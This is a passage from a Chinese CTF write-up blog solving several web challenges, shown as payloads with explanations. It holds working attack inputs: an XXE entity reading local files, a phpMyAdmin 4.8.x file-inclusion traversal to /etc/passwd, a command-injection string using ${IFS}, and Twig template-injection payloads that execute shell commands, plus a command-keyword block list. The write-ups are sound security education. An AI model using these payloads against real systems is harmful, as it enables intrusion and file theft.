class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/CK8BJG03EQERY8O69T0.png" srcset="/img/loading.gif" lazyload><br>可行，看能不能直接读取flag<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/MLC6SAFLMOJVT39WPR.png" srcset="/img/loading.gif" lazyload></p>
<p>传送门&#x3D;&#x3D;&#x3D;&gt;<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p>
<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="/images/JMFRP9VYT5A0VKQDORT.png" srcset="/img/loading.gif" lazyload><br>整了个这么个界面，有点迷糊，抓包源码都没获得有效的信息<br>用dirsearch扫扫，扫到了robots.txt，里面提示了个phpinfo.php，还是没有找到有效的信息<br>再往后继续扫到了phpmyadmin，进入查看，数据库里一大堆内容根本懒得看<br><img src="/images/XXQ3LARFHLVNSZQEEQW.png" srcset="/img/loading.gif" lazyload><br>查阅到4.8.0 &lt;&#x3D; phpMyAdmin &lt; 4.8.2版本的phpmyadmin都是有文件包含漏洞<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111039461">漏洞复现</a><br>例如传入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">target</span><span class="hljs-operator">=</span>db_datadict.php<span class="hljs-variable">%253</span>f<br></code></pre></td></tr></table></figure>
<p>由于服务器会自动解码一次，所以在checkPageValidity()中，$page的值一开始会是db_datadict.php%3f,又一次url解码后变成了db_datadict.php?,这便符合了?前内容在白名单的要求，函数返回true但在index.php中$_REQUEST[‘target’]仍然是db_datadict.php%3f,而且会被include，通过目录穿越，就可造成任意文件包含</p>
<p>漏洞原理是：<br>利用&#x2F;使db_datadict.php?成为一个不存在目录，利用include函数的目录不断跳转尝试得到flag目录。</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">25</span></span>的url编码为%<br><span class="hljs-tag">%<span class="hljs-selector-tag">3f</span></span>的url编码为?<br><span class="hljs-tag">%<span class="hljs-selector-tag">253f</span></span>--&gt;?<br></code></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>

<p><img src="/images/G1EYMWNMMY6OS2BF0.png" srcset="/img/loading.gif" lazyload><br>可以成功执行，获取到了passwd文件的内容，尝试查找flag<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure>

<p><img src="/images/XZ69C0YPOUN95B37GM.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="BJDCTF2020 Mark loves cat"></a>BJDCTF2020 Mark loves cat</h2><p>查看源码以及抓包，没有找到有用的信息<br>尝试dirsearch扫描，发现存在.git泄露<br>那么直接用git_hack扫出文件<br>在index.php文件中找出php源码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><span class="hljs-regexp">/*include &#x27;flag.php&#x27;;*/</span><br>highlight_file(__FILE__);<br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exit和die一样，都是输出一条信息后退出当前脚本<br>上面的代码中最重要的两块代码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>利用一下,先解释一下可变变量：<br>如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量之前再多加一个$符号<br>例：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=&#x27;b&#x27;;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=&#x27;bbbb&#x27;;</span><br>echo <span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a;<br><span class="hljs-comment">//输出bbbb </span><br><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>a-&gt;<span class="hljs-symbol">$</span>b<br></code></pre></td></tr></table></figure>
<p>简单理解为$$a相当于$($a)<br>再对上面的代码进行解读</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>比如GET输入a&#x3D;flag<br>那么$x&#x3D;a,$y&#x3D;flag<br> $$x &#x3D; $$y所以$a&#x3D;$flag,配合exit这样就可以输入$flag的值了<br> 构造payload<br> <figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?handsome=<span class="hljs-built_in">flag</span>&amp;x=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=x<br></code></pre></td></tr></table></figure><br>handsome&#x3D;flag不用说 就是让$handsome&#x3D;$flag<br>后面的目的就是让我们传入的变量是 flag 值不是flag 进而能够exit handsome<br>这里的值表面是 x 但前面我们进行了变量覆盖使得 x&#x3D;flag 所以在这里我们输出x的值就是flag的值<br><img src="/images/JNSYNMWR0M0GM7R.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>看到这种没有很多描述的题直接掏出dirsearch<br>扫出robots.txt<br>里面提示了fAke_f1agggg.php<br>进入查看，不出意料<br>哪哪都看一看<br>找到一个<br><img src="/images/UK82BH2SOKD0KWXEE9F6U.png" srcset="/img/loading.gif" lazyload><br>很难绷<br><img src="/images/0F4A1WUAHEN3Y59N.png" srcset="/img/loading.gif" lazyload><br>探索到一个新功能🙂<br><img src="/images/TLFZIYE71LUDA05O.png" srcset="/img/loading.gif" lazyload><br>转化之后</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>好受多了，现在也容易了<br>直接payload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=ls<br><span class="hljs-comment">//404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </span><br>?<span class="hljs-attr">num</span><span class="hljs-operator">=</span><span class="hljs-number">3e4</span><span class="hljs-variable">&amp;md5</span>=<span class="hljs-number">0e215962017</span><span class="hljs-variable">&amp;get_flag</span>=tac$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br><span class="hljs-comment">//flag&#123;0a4bf020-4cfd-4519-ac84-0481a8b786a2&#125; </span><br></code></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>输入admin试试<br>回显admin<br>找到源代码<br><img src="/images/0UOK26JNCRDJ39EQSF.png" srcset="/img/loading.gif" lazyload><br>看看能不能x一下<br><img src="/images/XXRMNSDFETL2IUQW.png" srcset="/img/loading.gif" lazyload><br>被html转为实体字符了，不能x<br>hint中有提醒Why not take a closer look at cookies？<br>抓包看看<br>有两个包，第二个包cookie中user可以改变页面回显<br>那就抓到第二个包<br>本题的知识点是利用服务器模板注入攻击，SSTI里面的Twig攻击<br>判断模板注入类型的方法<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png" srcset="/img/loading.gif" lazyload><br>输入49,返回49表示是Twig模块<br>输入49,返回7777777表示是jinja2模块<br>在cookie处进行判断<br>user&#x3D;49,查看返回值<br><img src="/images/B08XOX2WGAPXVUVF5.png" srcset="/img/loading.gif" lazyload><br>判断为Twig注入<br>由于是Twig注入，所以有国定的payload</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看id</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看flag</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/AZJKHF8MYLVSXY26LX.png" srcset="/img/loading.gif" lazyload><br><img src="/images/JCTE5HBQ6IX0LVB42K.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056#toc-16">Twig模板注入从零到一</a></p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url有点奇怪<br><img src="/images/O7TO6JUWTEDZZKGNI8.png" srcset="/img/loading.gif" lazyload><br>cmd随便输入123<br>有回显，执行一下命令<br>echo%201，forbid ~<br>被禁止了<br>再看img，有点像base64编码过的，base64解码一下<br><img src="/images/WHMHWO5NM9TXT02WL.png" srcset="/img/loading.gif" lazyload><br>更像base64编码过的了<br>再来一下<br><img src="/images/SCSFCWCUQ0RRMHNUTV.png" srcset="/img/loading.gif" lazyload><br>16进制解码试试<br><img src="/images/GSFC2R2VJOYPWHQ8WJR.png" srcset="/img/loading.gif" lazyload><br>路子都知道了<br>在img里上传一个index.php试试<br>同样的方法再编码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php<br><span class="hljs-regexp">//</span>to HEX<br><span class="hljs-number">696</span>e6465782e706870<br><span class="hljs-regexp">//</span>to Base64<br>Njk2ZTY0NjU3ODJlNzA2ODcw<br><span class="hljs-regexp">//</span>to Base64<br>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<br></code></pre></td></tr></table></figure>

<p><img src="/images/W79NAB1O0JIUAANS4SU5O.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://www.lddgo.net/convert/base64-to-image">base64编码转图片</a><br>下载下来后用记事本打开，php源码就找出来了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>重点是下面的代码</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-subst">\&#x27;</span>|<span class="hljs-subst">\&quot;</span>|\`|;|,|\*|\?|<span class="hljs-subst">\\</span>|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>|<span class="hljs-subst">\n</span>|<span class="hljs-subst">\t</span>|<span class="hljs-subst">\r</span>|\xA0|\&#123;|\&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|\&amp;[^\d]|@|\||<span class="hljs-subst">\\</span>$|\[|\]|&#123;|&#125;|<span class="hljs-subst">\(<span class="hljs-operator">|</span>\)</span>|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    echo(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((string)<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;] <span class="hljs-operator">!==</span> (string)<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;] <span class="hljs-operator">&amp;&amp;</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;a&#x27;]) <span class="hljs-operator">===</span> md5(<span class="hljs-variable">$_POST</span>[&#x27;b&#x27;])) &#123;<br>        echo `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        echo 